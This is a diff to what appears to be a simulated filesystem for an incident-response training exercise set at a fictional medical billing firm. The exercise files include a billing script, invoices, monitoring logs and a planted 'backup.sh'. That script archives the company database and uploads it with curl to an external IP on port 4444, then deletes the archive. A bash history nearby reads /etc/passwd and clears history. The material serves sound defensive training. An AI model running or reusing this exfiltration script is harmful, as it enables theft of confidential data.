@@ -2051,10 +2051,11 @@ const termFS = {
   '/home/analyst/Desktop':   { v:[],                                h:[],                                      p:'/home/analyst' },
   '/home/analyst/logs':   { v:['access.log','error.log'],                     h:[],                                      p:'/home/analyst' },
   '/home/jreyes':         { v:['auth.log','syslog'],                           h:['.bash_history','.bashrc'],             p:'/home' },
-  '/home/service_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
+  '/home/service_backup':      { v:['backup.sh'],                                  h:['.bash_history','.ssh'],                p:'/home' },
   '/home/service_backup/.ssh': { v:['authorized_keys'],                           h:[],                                      p:'/home/service_backup' },
-  '/home/billing_service':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
-  '/home/service_monitor':    { v:[],                                              h:[],                                      p:'/home' },
+  '/home/billing_service':    { v:['run_daily.py','README.txt','invoices'],        h:['.bashrc'],                             p:'/home' },
+  '/home/billing_service/invoices': { v:['may_2026.csv','apr_2026.csv','reconciliation_notes.txt'], h:[], p:'/home/billing_service' },
+  '/home/service_monitor':    { v:['monitor.sh','config.ini','alerts.log'],        h:[],                                      p:'/home' },
   '/home/dev_marcus':     { v:[],                                              h:['.bashrc','.bash_history'],             p:'/home' },
   '/bin':                 { v:['bash','sh','ls','cat','grep','ps'],            h:[],                                      p:'/' },
   '/usr':                 { v:['bin','sbin','local'],                          h:[],                                      p:'/' },
@@ -2146,6 +2147,122 @@ ls /tmp
 cat /etc/passwd
 history -c`,
   '/home/billing_service/.bashrc': '# ~/.bashrc — billing_service\nexport PATH=/usr/local/bin:/usr/bin:/bin\nexport BILLING_ENV=production\nexport DB_HOST=127.0.0.1',
+  '/home/billing_service/README.txt': `billing_service account — ClearPath Medical Billing
+Maintained by: Jordan Reyes (IT)
+Last updated: March 2024
+============================
+This service account runs the daily billing automation script.
+It connects to the MySQL database to process pending invoices
+and update billing records.
+
+Schedule: runs daily at 08:10 via /usr/bin/python3 /opt/billing/run_daily.py
+Permissions: read/write to billing_records table only — no admin rights
+Contact Jordan if the script fails or logs look unusual.`,
+  '/home/billing_service/run_daily.py': `#!/usr/bin/env python3
+# run_daily.py — ClearPath daily billing processor
+# Runs as: billing_service
+# Do not modify without IT approval
+
+import mysql.connector
+import logging
+import datetime
+
+logging.basicConfig(filename='/var/log/billing.log', level=logging.INFO)
+log = logging.getLogger(__name__)
+
+def run():
+    conn = mysql.connector.connect(
+        host='127.0.0.1', user='billing_service',
+        password='[redacted]', database='clearpath_db'
+    )
+    cursor = conn.cursor()
+    today = datetime.date.today().isoformat()
+    cursor.execute(
+        "SELECT invoice_id, amount FROM billing_records WHERE status = 'pending' AND due_date <= %s", (today,)
+    )
+    rows = cursor.fetchall()
+    log.info(f"Processing {len(rows)} invoices due by {today}")
+    for inv_id, amount in rows:
+        cursor.execute(
+            "UPDATE billing_records SET status = 'processed' WHERE invoice_id = %s", (inv_id,)
+        )
+    conn.commit()
+    log.info("Daily billing run complete.")
+    cursor.close()
+    conn.close()
+
+if __name__ == '__main__':
+    run()`,
+  '/home/billing_service/invoices/may_2026.csv': `invoice_id,patient_id,amount,status,due_date
+10041,4421,340.00,processed,2026-05-01
+10042,3309,125.50,processed,2026-05-01
+10043,5512,892.00,processed,2026-05-07
+10044,2201,67.00,pending,2026-05-31
+10045,6634,215.75,pending,2026-05-31`,
+  '/home/billing_service/invoices/apr_2026.csv': `invoice_id,patient_id,amount,status,due_date
+9981,4421,210.00,processed,2026-04-01
+9982,1103,445.00,processed,2026-04-07
+9983,7721,90.25,processed,2026-04-15
+9984,3309,125.50,processed,2026-04-30`,
+  '/home/billing_service/invoices/reconciliation_notes.txt': `April 2026 Reconciliation — completed May 2
+- 4 invoices processed, 0 discrepancies
+- Invoice 9983 flagged by provider (duplicate charge) — resolved, credited
+
+May 2026 Reconciliation — in progress
+- 3 processed as of May 17
+- 2 pending (due May 31)
+- NOTE: Run script again after May 31 to finalize`,
+  '/home/service_monitor/config.ini': `[monitor]
+host = 127.0.0.1
+port = 22
+check_interval = 300
+alert_threshold = 5
+
+[alerts]
+email = jordan@clearpath-internal.local
+log_file = /home/service_monitor/alerts.log
+
+[services]
+watch = sshd, mysqld, apache2`,
+  '/home/service_monitor/monitor.sh': `#!/bin/bash
+# monitor.sh — lightweight service health check
+# Runs as: service_monitor every 5 minutes via cron
+
+SERVICES=("sshd" "mysqld" "apache2")
+LOG="/home/service_monitor/alerts.log"
+DATE=$(date '+%Y-%m-%d %H:%M:%S')
+
+for svc in "\${SERVICES[@]}"; do
+  if ! systemctl is-active --quiet "$svc"; then
+    echo "[$DATE] ALERT: $svc is not running" >> "$LOG"
+  else
+    echo "[$DATE] OK: $svc running" >> "$LOG"
+  fi
+done`,
+  '/home/service_monitor/alerts.log': `[2026-05-17 23:55:01] OK: sshd running
+[2026-05-17 23:55:01] OK: mysqld running
+[2026-05-17 23:55:01] OK: apache2 running
+[2026-05-18 00:00:01] OK: sshd running
+[2026-05-18 00:00:01] OK: mysqld running
+[2026-05-18 00:00:01] OK: apache2 running
+[2026-05-18 02:10:01] OK: sshd running
+[2026-05-18 02:10:01] OK: mysqld running
+[2026-05-18 02:10:01] OK: apache2 running
+[2026-05-18 08:00:01] OK: sshd running
+[2026-05-18 08:00:01] OK: mysqld running
+[2026-05-18 08:00:01] OK: apache2 running`,
+  '/home/service_backup/backup.sh': `#!/bin/bash
+# backup.sh
+# NOTE: This script was found in service_backup home directory.
+# IT has no record of creating or approving this script.
+
+DEST="185.220.101.42"
+PORT="4444"
+DATA="/tmp/out.tar.gz"
+
+tar czf $DATA /var/lib/mysql/clearpath_db 2>/dev/null
+curl -s -T $DATA ftp://$DEST:$PORT/upload/ 2>/dev/null
+rm -f $DATA`,
   '/home/analyst/.bashrc': '# ~/.bashrc: executed by bash(1) for non-login shells.',
   '/home/analyst/Documents/pii.txt': `ClearPath Medical Billing — PII/PHI Reference Sheet
 Prepared by: Jordan Reyes, IT Manager
